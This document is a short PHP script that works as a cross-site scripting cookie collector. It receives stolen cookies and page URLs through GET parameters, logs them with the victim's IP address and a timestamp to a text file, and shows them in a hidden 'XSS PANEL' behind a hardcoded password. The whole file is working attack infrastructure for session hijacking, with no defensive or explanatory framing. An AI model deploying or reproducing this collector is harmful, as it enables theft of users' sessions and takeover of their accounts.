
<?php
$textFile = 'data.txt';
//Getting cookies
if (isset($_GET['c']) && isset($_GET['u']))
{
    date_default_timezone_set("Asia/Baku");
    $cookie = $_GET['c'];
    $urlPath = $_GET['u'];
    $referer = @$_SERVER['HTTP_REFERER'];
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!file_exists($textFile))
    {
        touch($textFile);
    }
    $file = fopen($textFile,'a');
    fwrite($file,date("Y-m-d H:i:s").PHP_EOL);
    fwrite($file,$urlPath.PHP_EOL);
    fwrite($file,$cookie.PHP_EOL);
    fwrite($file,$ip.PHP_EOL);
    fwrite($file,'---------XSS---------'.PHP_EOL.PHP_EOL);
    fclose($file);

}
//Admin url = get.php?loginAs=root
if (isset($_GET['loginAs']))
{
    if ($_GET['loginAs'] == 'root')
    {
        echo ' 
        <!doctype html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport"
                  content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
            <meta http-equiv="X-UA-Compatible" content="ie=edge">
            <title>XSS PANEL</title>
        </head> 
        <body>
        ';
        if (isset($_POST['pass']) && !empty($_POST['pass']))
        {
            $pass = $_POST['pass'];
            if ($pass === '123123')
            {
                if(file_exists($textFile))
                {
                    $datax = file_get_contents($textFile);
                    echo "<pre style='white-space: pre-line'>$datax</pre>";
                }else{
                    touch($textFile);
                }
            }
        }else{
            echo '
                    <form action="" method="post" style="text-align: center">
                        <input type="text" name="pass">
                        <input type="submit" value="" style="visibility: hidden">
                    </form>
                    ';
        }

        echo '
        </body>
        </html>
        ';
    }
}

?>


